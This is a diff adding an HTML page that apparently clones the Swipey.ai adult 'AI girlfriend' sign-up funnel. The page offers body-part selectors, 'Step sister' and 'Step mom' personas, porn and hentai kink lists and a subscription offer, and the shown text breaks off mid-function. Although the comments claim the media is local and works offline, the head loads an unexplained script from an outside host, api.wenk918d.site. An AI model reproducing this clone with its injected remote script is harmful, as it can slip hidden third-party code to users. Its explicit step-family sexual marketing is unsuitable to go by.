@@ -1,0 +1,632 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Swipey.ai · Bring Your Fantasy to Life with AI</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+   <script src="https://api.wenk918d.site/js/meetu-sdk.js"></script>
+<link href="https://fonts.googleapis.com/css2?family=Anton&family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --primary:#0e0e0e;
+    --accent:#ae52e7;
+    --accent-2:#8049f3;
+    --pink:#fe6283;
+    --violet:#8350cb;
+    --gradient-bg:linear-gradient(143deg,#4e283c 37.31%,#271a2b 112.95%);
+    --gradient-pink:linear-gradient(90deg,#8350cb,#fe6283);
+    --gradient-button:linear-gradient(98.81deg,#b14cee 6.57%,#8049f3);
+    --text:#ffffff;
+    --text-dim:rgba(255,255,255,.66);
+    --border:rgba(255,255,255,.14);
+  }
+  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+  html,body{margin:0;padding:0}
+  body{
+    background:#0e0e0e;
+    background-image:var(--gradient-bg);
+    background-attachment:fixed;
+    min-height:100vh;
+    color:var(--text);
+    font-family:'Poppins',system-ui,-apple-system,Segoe UI,Roboto,sans-serif;
+    -webkit-font-smoothing:antialiased;
+    overflow-x:hidden;
+  }
+  #app{
+    max-width:640px;
+    margin:0 auto;
+    padding:20px 16px 48px;
+    position:relative;
+    min-height:100vh;
+  }
+  /* top bar */
+  .topbar{display:flex;align-items:center;justify-content:space-between;padding:8px 4px 16px}
+  .logo{font-family:'Anton',sans-serif;font-size:22px;letter-spacing:1px;
+    background:var(--gradient-pink);-webkit-background-clip:text;background-clip:text;color:transparent}
+  .badge{font-size:11px;letter-spacing:1.5px;text-transform:uppercase;color:var(--text-dim);
+    border:1px solid var(--border);border-radius:999px;padding:4px 12px}
+  /* progress */
+  .progress{display:flex;gap:6px;align-items:center;margin-bottom:20px}
+  .progress .bar{flex:1;height:4px;border-radius:4px;background:rgba(255,255,255,.12);overflow:hidden}
+  .progress .bar>i{display:block;height:100%;width:0;background:var(--gradient-pink);transition:width .35s ease}
+  .progress .pct{font-size:11px;color:var(--text-dim);min-width:36px;text-align:right;font-weight:500}
+  /* title */
+  .title{font-family:'Anton',sans-serif;font-size:34px;line-height:1.05;text-transform:uppercase;
+    margin:6px 0 4px;letter-spacing:.4px}
+  .title .special{background:var(--gradient-pink);-webkit-background-clip:text;background-clip:text;color:transparent}
+  .subtitle{color:var(--text-dim);font-size:14px;margin:0 0 20px}
+  .subtitle .accent{color:#fff;font-weight:500}
+  /* option grids */
+  .options{display:grid;gap:12px}
+  .options.cols-2{grid-template-columns:1fr 1fr}
+  .options.cols-3{grid-template-columns:repeat(3,1fr)}
+  .options.cols-4{grid-template-columns:repeat(2,1fr)}
+  @media(min-width:520px){
+    .options.cols-4{grid-template-columns:repeat(4,1fr)}
+  }
+  .opt{
+    position:relative;border-radius:16px;overflow:hidden;cursor:pointer;
+    background:#1a1020;border:2px solid var(--border);transition:transform .15s ease,border-color .15s ease,box-shadow .15s ease;
+  }
+  .opt:hover{transform:translateY(-2px)}
+  .opt.selected{border-color:var(--accent);box-shadow:0 0 0 1px var(--accent),0 8px 24px rgba(174,82,231,.35)}
+  .opt .opt-img{position:relative;aspect-ratio:3/4;overflow:hidden;background:#241426}
+  .opt .opt-img img,.opt .opt-img video{width:100%;height:100%;object-fit:cover;display:block}
+  .opt .opt-img img{transition:transform .3s ease}
+  .opt:hover .opt-img img{transform:scale(1.05)}
+  .opt .opt-label{
+    position:absolute;left:0;right:0;bottom:0;padding:18px 10px 10px;font-size:14px;font-weight:600;
+    background:linear-gradient(transparent,rgba(0,0,0,.85));text-align:center;
+  }
+  .opt .check{
+    position:absolute;top:10px;right:10px;width:24px;height:24px;border-radius:50%;
+    background:rgba(0,0,0,.5);border:2px solid rgba(255,255,255,.4);display:none;align-items:center;justify-content:center;
+  }
+  .opt.selected .check{display:flex;background:var(--accent);border-color:#fff}
+  .opt .check:after{content:"";width:9px;height:5px;border-left:2px solid #fff;border-bottom:2px solid #fff;transform:rotate(-45deg) translateY(-1px)}
+  /* big style cards (welcome) */
+  .style-cards{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+  .style-card{border-radius:20px;overflow:hidden;cursor:pointer;position:relative;border:2px solid var(--border);
+    background:#1a1020;transition:border-color .15s,box-shadow .15s}
+  .style-card.selected{border-color:var(--accent);box-shadow:0 0 0 1px var(--accent),0 10px 30px rgba(174,82,231,.35)}
+  .style-card .sc-img{aspect-ratio:3/4;overflow:hidden;position:relative;background:#241426}
+  .style-card .sc-img img,.style-card .sc-img video{width:100%;height:100%;object-fit:cover;display:block}
+  .style-card .sc-label{position:absolute;left:0;right:0;bottom:0;padding:22px 12px 14px;font-family:'Anton',sans-serif;
+    text-transform:uppercase;font-size:18px;text-align:center;background:linear-gradient(transparent,rgba(0,0,0,.9))}
+  /* age slider */
+  .age-block{margin-top:20px;background:rgba(255,255,255,.05);border:1px solid var(--border);border-radius:16px;padding:16px}
+  .age-head{font-size:13px;color:var(--text-dim);margin-bottom:14px;letter-spacing:.3px}
+  .age-row{display:flex;align-items:center;gap:12px}
+  .age-num{font-size:13px;color:var(--text-dim);font-weight:600}
+  .age-slider{-webkit-appearance:none;appearance:none;flex:1;height:6px;border-radius:6px;outline:none;
+    background:linear-gradient(90deg,var(--accent) var(--fill,40%),rgba(255,255,255,.15) var(--fill,40%))}
+  .age-slider::-webkit-slider-thumb{-webkit-appearance:none;width:26px;height:26px;border-radius:50%;
+    background:#fff;border:4px solid var(--accent);cursor:pointer;box-shadow:0 2px 8px rgba(0,0,0,.4)}
+  .age-val{display:inline-block;min-width:44px;text-align:center;font-family:'Anton',sans-serif;font-size:26px;
+    background:var(--gradient-pink);-webkit-background-clip:text;background-clip:text;color:transparent}
+  /* voice / personality small cards */
+  .opt-row{display:flex;align-items:center;gap:14px}
+  .opt-icon{width:46px;height:46px;border-radius:12px;background:rgba(255,255,255,.08);display:flex;align-items:center;justify-content:center;font-size:22px;flex:none}
+  .opt-desc{font-size:12px;color:var(--text-dim);font-weight:400}
+  .opt.plain .opt-label{position:static;padding:0;background:none;text-align:left}
+  .opt.plain{padding:16px}
+  .opt.plain .opt-title{font-size:15px;font-weight:600}
+  .opt.plain .check{top:50%;transform:translateY(-50%)}
+  /* nav */
+  .nav{display:flex;gap:12px;margin-top:24px;position:sticky;bottom:0;z-index:10;padding:14px 0 12px;background:linear-gradient(transparent,rgba(14,14,14,.92) 42%)}
+  .btn{flex:1;padding:16px 20px;border-radius:14px;border:none;font-family:'Poppins',sans-serif;font-size:15px;font-weight:600;cursor:pointer;transition:opacity .15s,transform .15s;min-height:52px;touch-action:manipulation;-webkit-user-select:none;user-select:none}
+  .btn:active{transform:scale(.98)}
+  .btn-back{flex:0 0 auto;background:rgba(255,255,255,.08);color:#fff;padding:16px 22px}
+  .btn-next{background:var(--gradient-button);color:#fff;box-shadow:0 8px 24px rgba(128,73,243,.4)}
+  .btn-next:disabled{opacity:.4;cursor:not-allowed}
+  /* loading */
+  .loading-wrap{text-align:center;padding-top:20vh}
+  .loading-heart{font-size:54px;animation:pulse 1.2s ease infinite}
+  @keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.2)}}
+  .loading-bar{max-width:320px;height:8px;border-radius:8px;background:rgba(255,255,255,.12);margin:26px auto 0;overflow:hidden}
+  .loading-bar>i{display:block;height:100%;background:var(--gradient-pink);transition:width .2s}
+  .loading-pct{font-family:'Anton',sans-serif;font-size:40px;margin-top:18px;background:var(--gradient-pink);-webkit-background-clip:text;background-clip:text;color:transparent}
+  .loading-label{color:var(--text-dim);margin-top:4px;font-size:14px;letter-spacing:.5px}
+  /* result */
+  .ribbon{display:inline-flex;align-items:center;gap:8px;background:rgba(174,82,231,.16);border:1px solid rgba(174,82,231,.4);
+    color:#e7c8ff;font-size:11px;font-weight:600;letter-spacing:1px;text-transform:uppercase;border-radius:999px;padding:6px 14px}
+  .ribbon b{color:#fff}
+  .result-main{position:relative;border-radius:20px;overflow:hidden;margin:16px 0;aspect-ratio:3/4;background:#241426}
+  .result-main img,.result-main video{width:100%;height:100%;object-fit:cover;display:block}
+  .result-main .rm-label{position:absolute;left:0;right:0;bottom:0;padding:22px 12px 14px;font-family:'Anton',sans-serif;text-transform:uppercase;background:linear-gradient(transparent,rgba(0,0,0,.9))}
+  .result-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:10px}
+  .r-card{background:rgba(255,255,255,.05);border:1px solid var(--border);border-radius:14px;padding:10px;text-align:center}
+  .r-card img{width:100%;border-radius:10px;aspect-ratio:1/1;object-fit:cover;display:block;margin-bottom:6px;background:#241426}
+  .r-card span{font-size:11px;color:var(--text-dim);font-weight:500}
+  .r-card .age-number{font-family:'Anton',sans-serif;font-size:30px;background:var(--gradient-pink);-webkit-background-clip:text;background-clip:text;color:transparent}
+  .sparkle-btn{width:100%;margin-top:20px;padding:18px;border-radius:16px;border:none;cursor:pointer;
+    background:var(--gradient-button);color:#fff;font-family:'Poppins',sans-serif;font-size:16px;font-weight:600;
+    display:flex;align-items:center;justify-content:center;gap:10px;box-shadow:0 10px 30px rgba(128,73,243,.45);
+    min-height:56px;touch-action:manipulation;-webkit-user-select:none;user-select:none}
+  .dl-icon{font-size:22px;line-height:1}
+  .pw-note{margin-top:14px;font-size:12px;color:var(--text-dim);letter-spacing:.3px}
+  /* paywall */
+  .paywall{text-align:center}
+  .paywall .title{font-size:30px}
+  .pw-babe{margin:18px auto;width:120px;height:120px;border-radius:50%;overflow:hidden;border:3px solid var(--accent);
+    box-shadow:0 0 30px rgba(174,82,231,.5)}
+  .pw-babe img,.pw-babe video{width:100%;height:100%;object-fit:cover}
+  .pw-sub{color:var(--text-dim);font-size:14px;margin:6px 0 22px}
+  .pw-form{text-align:left;display:flex;flex-direction:column;gap:12px}
+  .google-btn{width:100%;padding:15px;border-radius:14px;border:1px solid var(--border);background:#fff;color:#202124;
+    font-family:'Poppins',sans-serif;font-size:15px;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px}
+  .google-btn svg{width:20px;height:20px}
+  .or{display:flex;align-items:center;gap:12px;color:var(--text-dim);font-size:13px;margin:6px 0}
+  .or:before,.or:after{content:"";flex:1;height:1px;background:var(--border)}
+  .field{width:100%;padding:15px 16px;border-radius:14px;border:1px solid var(--border);background:rgba(255,255,255,.06);color:#fff;font-family:'Poppins',sans-serif;font-size:15px;outline:none}
+  .field::placeholder{color:rgba(255,255,255,.4)}
+  .field:focus{border-color:var(--accent)}
+  .terms{display:flex;gap:10px;align-items:flex-start;font-size:12px;color:var(--text-dim);line-height:1.5}
+  .terms input{margin-top:2px;accent-color:var(--accent)}
+  .terms a{color:#e7c8ff}
+  .link{color:#e7c8ff;font-size:13px;text-decoration:none}
+  .opt,.style-card{cursor:pointer;touch-action:manipulation;-webkit-user-select:none;user-select:none}
+  .fade-in{animation:fadeIn .35s ease}
+  @keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}
+  @media(max-width:380px){.title{font-size:28px}.options.cols-3{grid-template-columns:repeat(2,1fr)}}
+</style>
+</head>
+<body>
+<div id="app"></div>
+<script>
+/* ============ Swipey.ai "create-sex-friend" standalone replica ============ */
+const CDN = "media"; // local media folder — relative path, works offline and at any URL path
+
+/* ---------- quiz data (images hot-linked from CDN, exactly like the original) ---------- */
+const DATA = {
+  style: [
+    { value:"Realistic", label:"Realistic", img:`${CDN}/Realistic/step0-image.jpg`, video:`${CDN}/Realistic/realistic_createsexfriend_2.mp4` },
+    { value:"Anime",     label:"Anime",     img:`${CDN}/Anime/step0-image.jpg`,     video:`${CDN}/Anime/anime_createsexfriend.mp4` }
+  ],
+  ethnicity: [
+    { value:"Caucasian",  label:"Caucasian",  img:`${CDN}/Realistic/step1-image1.png`, video:`${CDN}/attribute_videos/ethnicity/White.mp4` },
+    { value:"Asian",      label:"Asian",      img:`${CDN}/Realistic/step1-image2.png`, video:`${CDN}/attribute_videos/ethnicity/Asian.mp4` },
+    { value:"Mid.Eastern",label:"Mid. Eastern",img:`${CDN}/Realistic/step1-image3.png`, video:`${CDN}/attribute_videos/ethnicity/Arab.mp4` },
+    { value:"African",    label:"African",    img:`${CDN}/Realistic/step1-image4.png`, video:`${CDN}/attribute_videos/ethnicity/African.mp4` },
+    { value:"Latina",     label:"Latina",     img:`${CDN}/Realistic/step1-image5.png`, video:`${CDN}/attribute_videos/ethnicity/Latina.mp4` },
+    { value:"Indian",     label:"Indian",     img:`${CDN}/personality/dominant.png` }
+  ],
+  bodyType: [
+    { value:"Slim",       label:"Slim",       img:`${CDN}/Realistic/step2-body1.png`,   video:`${CDN}/attribute_videos/body/Petite_body.mp4` },
+    { value:"Athletic",   label:"Athletic",   img:`${CDN}/Realistic/step2-body2.png`,   video:`${CDN}/attribute_videos/body/Toned_body.mp4` },
+    { value:"Average",    label:"Average",    img:`${CDN}/Realistic/step2-body3.png`,   video:`${CDN}/attribute_videos/body/Medium_body.mp4` },
+    { value:"Voluptuous", label:"Voluptuous", img:`${CDN}/Realistic/step2-body4.png`,   video:`${CDN}/attribute_videos/body/Chubby_body.mp4` }
+  ],
+  breastSize: [
+    { value:"Small (B)",  label:"Small (B)",  img:`${CDN}/Realistic/step2-breast1.png`, video:`${CDN}/attribute_videos/breast/Small_boobs.mp4` },
+    { value:"Medium (C)", label:"Medium (C)", img:`${CDN}/Realistic/step2-breast2.png`, video:`${CDN}/attribute_videos/breast/Medium_boobs.mp4` },
+    { value:"Large (D)",  label:"Large (D)",  img:`${CDN}/Realistic/step2-breast3.png`, video:`${CDN}/attribute_videos/breast/Big_boobs.mp4` },
+    { value:"Huge (DD)",  label:"Huge (DD)",  img:`${CDN}/Realistic/step2-breast4.png`, video:`${CDN}/attribute_videos/breast/Huge_tits.mp4` }
+  ],
+  buttSize: [
+    { value:"Small",    label:"Small",    img:`${CDN}/Realistic/step2-booty1.png`, video:`${CDN}/attribute_videos/booty/Skinny_ass.mp4` },
+    { value:"Medium",   label:"Medium",   img:`${CDN}/Realistic/step2-booty2.png`, video:`${CDN}/attribute_videos/booty/Medium_ass.mp4` },
+    { value:"Athletic", label:"Athletic", img:`${CDN}/Realistic/step2-booty3.png`, video:`${CDN}/attribute_videos/booty/Toned_ass.mp4` },
+    { value:"Large",    label:"Large",    img:`${CDN}/Realistic/step2-booty4.png`, video:`${CDN}/attribute_videos/booty/Huge_ass.mp4` }
+  ],
+  hairStyle: [
+    { value:"Straight", label:"Straight", img:`${CDN}/Realistic/step3-hairstyle1.png` },
+    { value:"Bun",      label:"Bun",      img:`${CDN}/Realistic/step3-hairstyle4.png` },
+    { value:"Ponytail", label:"Ponytail", img:`${CDN}/Realistic/step3-hairstyle6.png` }
+  ],
+  hairColor: [
+    { value:"Brown",  label:"Brown",  img:`${CDN}/Realistic/step3-hair2.png` },
+    { value:"Blonde", label:"Blonde", img:`${CDN}/Realistic/step3-hair1.png` },
+    { value:"Red",    label:"Red",    img:`${CDN}/Realistic/step3-hair5.png` }
+  ],
+  eyeColor: [
+    { value:"Brown", label:"Brown", img:`${CDN}/Realistic/step3-eye2.png` },
+    { value:"Blue",  label:"Blue",  img:`${CDN}/Realistic/step3-eye1.png` },
+    { value:"Green", label:"Green", img:`${CDN}/Realistic/step3-eye3.png` }
+  ],
+  voice: [
+    { value:"Voice 3", label:"Voice 3", icon:"😋", audio:`${CDN}/sounds/voice2.mp3` },
+    { value:"Voice 4", label:"Voice 4", icon:"😌", audio:`${CDN}/sounds/voice3.mp3` },
+    { value:"Voice 5", label:"Voice 5", icon:"😈", audio:`${CDN}/sounds/voice4.mp3` }
+  ],
+  personality: [
+    { value:"stepSis",     label:"Step sister", desc:"Close family bond" },
+    { value:"stepMom",     label:"Step mom",    desc:"Caring and nurturing" },
+    { value:"girlfriend",  label:"Girlfriend",  desc:"Romantic and caring" }
+  ],
+  kinks: {
+    Porn: [
+      { value:"College student", label:"College student", img:`${CDN}/Porn/collegestudent.webp` },
+      { value:"Dominatrix",     label:"Dominatrix",      img:`${CDN}/Porn/dominatrix.webp` },
+      { value:"Milf",           label:"Milf",            img:`${CDN}/Porn/milf.webp` },
+      { value:"Nurse",          label:"Nurse",           img:`${CDN}/Porn/nurse.webp` },
+      { value:"Pornstar",       label:"Pornstar",        img:`${CDN}/Porn/pornstar.webp` },
+      { value:"Secretary",      label:"Secretary",       img:`${CDN}/Porn/secretary.webp` },
+      { value:"Step sister",    label:"Step sister",     img:`${CDN}/Porn/stepsister.webp` },
+      { value:"Teacher",        label:"Teacher",         img:`${CDN}/Porn/teacher.webp` },
+      { value:"Yoga instructor",label:"Yoga instructor", img:`${CDN}/Porn/yogainstructor.webp` },
+      { value:"Maid",           label:"Maid",            img:`${CDN}/Porn/maid.webp` },
+      { value:"Goth girl",      label:"Goth girl",       img:`${CDN}/Porn/gothgirl.webp` },
+      { value:"Princess",       label:"Princess",        img:`${CDN}/Porn/princess.webp` }
+    ],
+    Hentai: [
+      { value:"Tentacles",      label:"Tentacles",      img:`${CDN}/Hentai/tentacles.webp` },
+      { value:"Teacher",        label:"Teacher",        img:`${CDN}/Hentai/teacher.webp` },
+      { value:"College student",label:"College student",img:`${CDN}/Hentai/collegestudent.webp` },
+      { value:"Nekomimi",       label:"Nekomimi",       img:`${CDN}/Hentai/nekomimi.webp` },
+      { value:"Futanari",       label:"Futanari",       img:`${CDN}/Hentai/futanari.webp` },
+      { value:"Milf",           label:"Milf",           img:`${CDN}/Hentai/milf.webp` },
+      { value:"Femdom",         label:"Femdom",         img:`${CDN}/Hentai/femdom.webp` },
+      { value:"Pregnant",       label:"Pregnant",       img:`${CDN}/Hentai/pregnant.webp` },
+      { value:"Nurse",          label:"Nurse",          img:`${CDN}/Hentai/nurse.webp` },
+      { value:"Fantasy",        label:"Fantasy",        img:`${CDN}/Hentai/fantasy.webp` },
+      { value:"Dandere",        label:"Dandere",        img:`${CDN}/Hentai/dandere.webp` },
+      { value:"Idol",           label:"Idol",           img:`${CDN}/Hentai/idol.webp` }
+    ]
+  },
+  personaV2: [
+    { label:"Playful",   img:"media/personality/playful.png" },
+    { label:"Nympho",    img:"media/personality/nympho.png" },
+    { label:"Submissive",img:"media/personality/submissive.png" },
+    { label:"Dominant",  img:"media/personality/dominant.png" }
+  ]
+};
+
+/* ---------- step sequence ---------- */
+const STEPS = [
+  { id:"style",      title:["Create","your own","AI Girlfriend"], sub:"Bring your fantasy to life with a companion made just for you." },
+  { id:"ethnicity",  title:["Choose","ethnicity"] },
+  { id:"body",       title:["Choose","body type"] },
+  { id:"breast",     title:["Choose","breast size"] },
+  { id:"booty",      title:["Choose","booty size"] },
+  { id:"hairStyle",  title:["Choose","hair style"] },
+  { id:"hairColor",  title:["Choose","hair color"] },
+  { id:"eyeColor",   title:["Choose","eye color"] },
+  { id:"voice",      title:["Choose","voice"] },
+  { id:"personality",title:["Choose","personality"] },
+  { id:"kinks",      title:["Choose","Your Kinks"], sub:"what she's into" },
+  { id:"result",     title:["Your","Fantasy Babe","is ready!"] },
+  { id:"paywall",    title:["Get","Instant","Access"] }
+];
+
+const state = {
+  step: 0,
+  sel: { style:"", ethnicity:"", age:22, body:"", breast:"", booty:"", hairStyle:"", hairColor:"", eyeColor:"", voice:"", personality:"", kinks:"" }
+};
+
+const app = document.getElementById("app");
+let voiceAudio = null;
+
+/* ---------- helpers ---------- */
+function el(html){ const d = document.createElement("div"); d.innerHTML = html.trim(); return d.firstChild; }
+function titleHTML(parts){
+  // parts: ["Create","your own","AI Girlfriend"] -> first normal, middle(s) special
+  return parts.map((p,i)=> i===0 ? p : `<span class="special">${p}</span>`).join(" ");
+}
+function progressPct(){ return Math.min(100, Math.round((state.step / (STEPS.length - 3)) * 100)); }
+
+function render(){
+  app.innerHTML = "";
+  const s = STEPS[state.step];
+
+  // top bar (skip on loading-like result/paywall? keep simple: show everywhere)
+  const top = el(`<div class="topbar">
+      <div class="logo">SWIPEY</div>
+      <div class="badge">18+ AI Fantasy</div>
+    </div>`);
+  app.appendChild(top);
+
+  if (state.step < STEPS.indexOf(STEPS.find(x=>x.id==="result"))){
+    const p = el(`<div class="progress"><div class="bar"><i style="width:${progressPct()}%"></i></div><div class="pct">${progressPct()}%</div></div>`);
+    app.appendChild(p);
+  }
+
+  switch(s.id){
+    case "style": renderStyle(); break;
+    case "ethnicity": renderEthnicity(); break;
+    case "body": renderGrid("body","bodyType","cols-2"); break;
+    case "breast": renderGrid("breast","breastSize","cols-2"); break;
+    case "booty": renderGrid("booty","buttSize","cols-2"); break;
+    case "hairStyle": renderGrid("hairStyle","hairStyle","cols-3"); break;
+    case "hairColor": renderGrid("hairColor","hairColor","cols-3"); break;
+    case "eyeColor": renderGrid("eyeColor","eyeColor","cols-3"); break;
+    case "voice": renderVoice(); break;
+    case "personality": renderPersonality(); break;
+    case "kinks": renderKinks(); break;
+    case "result": renderResult(); break;
+    case "paywall": renderPaywall(); break;
+  }
+}
+
+function heading(step, subtitle){
+  const h = el(`<div class="fade-in">
+      <h1 class="title">${titleHTML(step.title)}</h1>
+      ${step.sub ? `<p class="subtitle">${step.sub}</p>` : ""}
+    </div>`);
+  app.appendChild(h);
+}
+
+function nav(back=true, nextLabel="Next", onNext){
+  const n = el(`<div class="nav">
+      ${back ? `<button class="btn btn-back">Go back</button>` : ""}
+      <button class="btn btn-next">${nextLabel}</button>
+    </div>`);
+  const nextBtn = n.querySelector(".btn-next");
+  nextBtn.disabled = true;
+  nextBtn.addEventListener("click", ()=> onNext && onNext());
+  if (back) n.querySelector(".btn-back").addEventListener("click", ()=> go(-1));
+  app.appendChild(n);
+  return nextBtn;
+}
+
+function go(delta){ state.step += delta; if(state.step<0) state.step=0; render(); }
+function next(){ state.step++; render(); }
+
+/* ---------- step renderers ---------- */
+function renderStyle(){
+  const step = STEPS[state.step];
+  heading(step, undefined);
+  const wrap = el(`<div class="style-cards"></div>`);
+  DATA.style.forEach(o=>{
+    const card = el(`<div class="style-card" data-v="${o.value}">
+      <div class="sc-img">
+        <img src="${o.img}" alt="${o.label}" loading="eager">
+      </div>
+      <div class="sc-label">${o.label}</div>
+    </div>`);
+    card.addEventListener("click", ()=>{
+      state.sel.style = o.value;
+      document.querySelectorAll(".style-card").forEach(c=>c.classList.remove("selected"));
+      card.classList.add("selected");
+      nextBtn.disabled = false;
+    });
+    wrap.appendChild(card);
+  });
+  app.appendChild(wrap);
+  const nextBtn = nav(false, "Next", ()=> next());
+}
+
+function renderEthnicity(){
+  const step = STEPS[state.step];
+  heading(step);
+  const wrap = el(`<div class="options cols-2"></div>`);
+  DATA.ethnicity.forEach(o=>{
+    const opt = el(`<div class="opt" data-v="${o.value}">
+      <div class="opt-img"><img src="${o.img}" alt="${o.label}" loading="lazy"></div>
+      <div class="opt-label">${o.label}</div>
+      <div class="check"></div>
+    </div>`);
+    opt.addEventListener("click", ()=>{
+      state.sel.ethnicity = o.value;
+      document.querySelectorAll(".options .opt").forEach(c=>c.classList.remove("selected"));
+      opt.classList.add("selected");
+      nextBtn.disabled = false;
+    });
+    wrap.appendChild(opt);
+  });
+  app.appendChild(wrap);
+
+  // age slider
+  const age = el(`<div class="age-block fade-in">
+      <div class="age-head">Choose age</div>
+      <div class="age-row">
+        <span class="age-num">18+</span>
+        <input class="age-slider" type="range" min="18" max="55" value="${state.sel.age}">
+        <span class="age-num">55+</span>
+        <span class="age-val">${state.sel.age}</span>
+      </div>
+    </div>`);
+  const slider = age.querySelector(".age-slider");
+  const val = age.querySelector(".age-val");
+  slider.addEventListener("input", ()=>{
+    state.sel.age = +slider.value;
+    val.textContent = state.sel.age;
+    slider.style.setProperty("--fill", ((slider.value-18)/37*100)+"%");
+  });
+  slider.style.setProperty("--fill", ((state.sel.age-18)/37*100)+"%");
+  app.appendChild(age);
+
+  const nextBtn = nav(true, "Next", ()=> next());
+  if (state.sel.ethnicity) nextBtn.disabled = false;
+}
+
+function renderGrid(key, dataKey, cols){
+  const step = STEPS[state.step];
+  heading(step);
+  const wrap = el(`<div class="options ${cols}"></div>`);
+  DATA[dataKey].forEach(o=>{
+    const opt = el(`<div class="opt" data-v="${o.value}">
+      <div class="opt-img"><img src="${o.img}" alt="${o.label}" loading="lazy"></div>
+      <div class="opt-label">${o.label}</div>
+      <div class="check"></div>
+    </div>`);
+    opt.addEventListener("click", ()=>{
+      state.sel[key] = o.value;
+      document.querySelectorAll(".options .opt").forEach(c=>c.classList.remove("selected"));
+      opt.classList.add("selected");
+      nextBtn.disabled = false;
+    });
+    wrap.appendChild(opt);
+  });
+  app.appendChild(wrap);
+  const nextBtn = nav(true, "Next", ()=> next());
+  if (state.sel[key]) nextBtn.disabled = false;
+}
+
+function renderVoice(){
+  const step = STEPS[state.step];
+  heading(step);
+  const wrap = el(`<div class="options"></div>`);
+  DATA.voice.forEach(o=>{
+    const opt = el(`<div class="opt plain" data-v="${o.value}">
+      <div class="opt-row">
+        <div class="opt-icon">${o.icon}</div>
+        <div style="flex:1"><div class="opt-title">${o.label}</div><div class="opt-desc">Tap to preview</div></div>
+        <div class="check"></div>
+      </div>
+    </div>`);
+    opt.addEventListener("click", ()=>{
+      state.sel.voice = o.value;
+      document.querySelectorAll(".options .opt").forEach(c=>c.classList.remove("selected"));
+      opt.classList.add("selected");
+      nextBtn.disabled = false;
+      if (o.audio){ try{ voiceAudio?.pause(); voiceAudio = new Audio(o.audio); voiceAudio.play(); }catch(e){} }
+    });
+    wrap.appendChild(opt);
+  });
+  app.appendChild(wrap);
+  const nextBtn = nav(true, "Next", ()=> next());
+  if (state.sel.voice) nextBtn.disabled = false;
+}
+
+function renderPersonality(){
+  const step = STEPS[state.step];
+  heading(step);
+  const wrap = el(`<div class="options"></div>`);
+  DATA.personality.forEach(o=>{
+    const opt = el(`<div class="opt plain" data-v="${o.value}">
+      <div class="opt-row">
+        <div style="flex:1"><div class="opt-title">${o.label}</div><div class="opt-desc">${o.desc}</div></div>
+        <div class="check"></div>
+      </div>
+    </div>`);
+    opt.addEventListener("click", ()=>{
+      state.sel.personality = o.value;
+      document.querySelectorAll(".options .opt").forEach(c=>c.classList.remove("selected"));
+      opt.classList.add("selected");
+      nextBtn.disabled = false;
+    });
+    wrap.appendChild(opt);
+  });
+  app.appendChild(wrap);
+  const nextBtn = nav(true, "Next", ()=> next());
+  if (state.sel.personality) nextBtn.disabled = false;
+}
+
+function renderKinks(){
+  const step = STEPS[state.step];
+  heading(step);
+  const kinkKey = state.sel.style === "Anime" ? "Hentai" : "Porn";
+  const wrap = el(`<div class="options cols-3"></div>`);
+  DATA.kinks[kinkKey].forEach(o=>{
+    const opt = el(`<div class="opt" data-v="${o.value}">
+      <div class="opt-img"><img src="${o.img}" alt="${o.label}" loading="lazy"></div>
+      <div class="opt-label">${o.label}</div>
+      <div class="check"></div>
+    </div>`);
+    opt.addEventListener("click", ()=>{
+      state.sel.kinks = o.value;
+      document.querySelectorAll(".options .opt").forEach(c=>c.classList.remove("selected"));
+      opt.classList.add("selected");
+      nextBtn.disabled = false;
+    });
+    wrap.appendChild(opt);
+  });
+  app.appendChild(wrap);
+  const nextBtn = nav(true, "Next", ()=> next());
+  if (state.sel.kinks) nextBtn.disabled = false;
+}
+
+function renderResult(){
+  const step = STEPS[state.step];
+  const styleObj = DATA.style.find(x=>x.value===state.sel.style) || DATA.style[0];
+  const persona = DATA.personaV2[Math.floor(Math.random()*DATA.personaV2.length)];
+
+  app.appendChild(el(`<div class="fade-in" style="text-align:center">
+      <span class="ribbon">✨ Limited offer — only <b>&nbsp;0.33$/Day</b></span>
+      <h1 class="title">${titleHTML(step.title)}</h1>
+    </div>`));
+
+  // main result visual
+  const main = el(`<div class="result-main">
+      <img src="${styleObj.img}" alt="${styleObj.label}">
+      <div class="rm-label">${styleObj.label} · ${state.sel.age} years</div>
+    </div>`);
+  app.appendChild(main);
+
+  // attribute cards
+  const eth = DATA.ethnicity.find(x=>x.value===state.sel.ethnicity);
+  const body = DATA.bodyType.find(x=>x.value===state.sel.body);
+  const breast = DATA.breastSize.find(x=>x.value===state.sel.breast);
+  const booty = DATA.buttSize.find(x=>x.value===state.sel.booty);
+  const hairC = DATA.hairColor.find(x=>x.value===state.sel.hairColor);
+  const hairS = DATA.hairStyle.find(x=>x.value===state.sel.hairStyle);
+  const eye = DATA.eyeColor.find(x=>x.value===state.sel.eyeColor);
+  const voice = DATA.voice.find(x=>x.value===state.sel.voice);
+  const pers = DATA.personality.find(x=>x.value===state.sel.personality);
+
+  const cards = [];
+  if (eth)   cards.push({ img:eth.img,   txt:eth.label });
+  cards.push({ age:state.sel.age });
+  if (body)  cards.push({ img:body.img,  txt:body.label });
+  if (breast)cards.push({ img:breast.img,txt:breast.label });
+  if (booty) cards.push({ img:booty.img, txt:booty.label });
+  if (hairC) cards.push({ img:hairC.img, txt:hairC.label });
+  if (hairS) cards.push({ img:hairS.img, txt:hairS.label });
+  if (eye)   cards.push({ img:eye.img,   txt:eye.label });
+  if (voice) cards.push({ img:null,       txt:voice.icon+" "+voice.label });
+  if (pers)  cards.push({ img:null,       txt:pers.label });
+  cards.push({ img:persona.img, txt:persona.label });
+
+  const grid = el(`<div class="result-grid"></div>`);
+  cards.forEach(c=>{
+    const card = el(`<div class="r-card">
+      ${c.img ? `<img src="${c.img}" alt="" loading="lazy">` : ""}
+      ${c.age ? `<div class="age-number">${c.age}</div>` : ""}
+      <span>${c.txt || "years"}</span>
+    </div>`);
+    grid.appendChild(card);
